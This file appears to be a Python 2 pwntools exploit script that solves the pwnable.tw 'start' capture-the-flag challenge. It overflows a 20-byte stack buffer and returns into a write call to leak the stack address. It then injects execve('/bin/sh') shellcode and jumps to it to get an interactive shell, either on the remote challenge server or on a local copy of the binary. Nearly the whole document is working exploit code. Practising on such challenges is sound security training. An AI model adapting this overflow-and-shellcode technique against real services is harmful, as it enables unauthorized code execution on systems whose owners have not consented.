#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
from pwn import *


LOCALE = './files/start'
REMOTE = ['chall.pwnable.tw', 10000]

context.binary = LOCALE
context.binary.checksec()

##########################################################
############## Parse command line arguments ##############
##########################################################
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(*REMOTE)
elif len(sys.argv) > 1 and sys.argv[1] == 'locale':
    p = process(LOCALE)
else:
    print 'Usage: %s {remote|locale} [test]' % sys.argv[0]
    sys.exit(1)

if len(sys.argv) > 2 and sys.argv[2] == 'test':
    p.interactive()
    sys.exit(0)
##########################################################

with log.progress('Retrieving ESP') as l:
    payload = 'A' * 20
    payload += p32(0x08048087) # return to write so we leak buffer address

    p.sendafter(':', payload)
    esp = u32(p.recv()[:4])
    l.success(hex(esp))


with log.progress('Sending shellcode') as l:
    shellcode = asm('''
        push %d
        push %d
        xor edx, edx
        xor ecx, ecx
        mov ebx, esp
        mov eax, 0xb
        int 0x80
        ''' % (u32('/sh\x00'), u32('/bin')))

    payload = 'A' * 20
    payload += p32(esp + 20)
    payload += shellcode
    p.sendline(payload)
    l.success()

p.interactive()
p.close()
